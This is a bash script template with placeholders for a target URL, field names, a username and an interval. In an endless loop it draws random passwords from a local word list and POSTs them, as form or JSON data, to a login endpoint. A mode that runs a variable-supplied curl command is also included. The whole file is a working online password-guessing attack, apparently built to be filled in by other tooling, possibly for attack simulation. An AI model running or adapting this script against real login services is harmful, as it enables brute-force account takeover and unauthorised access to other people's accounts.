#!/bin/bash
TARGET=${target}
USERNAME_FIELD=${username_field}
PASSWORD_FIELD=${password_field}
USERNAME_TARGET=${username_target}
INTERVAL=${interval}
JSON=${is_json_request}
CUSTOM=${is_custom}
CUSTOM_CURL_COMMAND=${custom_curl_command}

while true; do
  pw=$(shuf -n 1 /opt/dpg-passwords.txt)
  echo "Trying password $pw"
  if [[ $CUSTOM = "true" ]]; then
    $CUSTOM_CURL_COMMAND $pw
  elif [[ $JSON = "true" ]]; then
    curl -X POST -H 'Content-Type: application/json' -d "{\"$USERNAME_FIELD\": \"$USERNAME_TARGET\", \"$PASSWORD_FIELD\":\"$pw\"}" $TARGET
  else
    curl -X POST -F "$USERNAME_FIELD=$USERNAME_TARGET" -F "$PASSWORD_FIELD=$pw" $TARGET
  fi
  echo
  sleep $INTERVAL
done
